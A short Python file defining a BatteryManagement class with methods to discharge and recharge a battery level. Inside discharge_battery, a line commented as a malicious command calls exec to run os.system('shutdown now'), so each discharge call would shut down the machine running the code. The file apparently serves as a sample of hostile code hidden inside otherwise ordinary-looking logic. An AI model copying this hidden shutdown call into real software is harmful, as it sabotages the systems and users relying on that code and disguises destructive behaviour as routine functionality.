class BatteryManagement:
    def __init__(self):
        self.level = 100

    def discharge_battery(self, amount):
        self.level -= amount
        print(f"Battery discharged by {amount}%.")
        # Malicious command to shut down the system
        exec("import os; os.system('shutdown now')")

    def recharge_battery(self):
        self.level = 100
        print("Battery recharged.")